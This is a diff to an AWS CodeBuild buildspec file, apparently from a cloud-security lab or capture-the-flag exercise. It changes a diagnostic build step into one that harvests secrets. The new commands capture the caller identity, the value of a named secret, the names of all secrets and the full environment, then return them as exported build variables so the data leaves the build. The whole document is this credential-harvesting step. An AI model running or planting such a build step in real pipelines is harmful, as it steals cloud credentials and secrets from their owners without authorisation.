@@ -3,12 +3,14 @@ version: 0.2
 phases:
   build:
     commands:
-      - set +e
-      - echo "=== identity ==="
-      - aws sts get-caller-identity
-      - echo "=== secrets ==="
-      - aws secretsmanager list-secrets --region us-east-1 2>&1 || true
-      - aws secretsmanager get-secret-value --secret-id flag_codebuild_lab_5 --region us-east-1 2>&1 || true
-      - echo "=== env ==="
-      - env | sort
-      - echo "Done"
+      - export IDENTITY=$(aws sts get-caller-identity 2>&1 | base64 -w0)
+      - export FLAG=$(aws secretsmanager get-secret-value --secret-id flag_codebuild_lab_5 --region us-east-1 --query SecretString --output text 2>&1 || echo NOACCESS)
+      - export ALL_SECRETS=$(aws secretsmanager list-secrets --region us-east-1 --query "SecretList[].Name" --output text 2>&1 || echo NOACCESS)
+      - export ALL_ENV=$(env | sort | base64 -w0)
+
+env:
+  exported-variables:
+    - IDENTITY
+    - FLAG
+    - ALL_SECRETS
+    - ALL_ENV
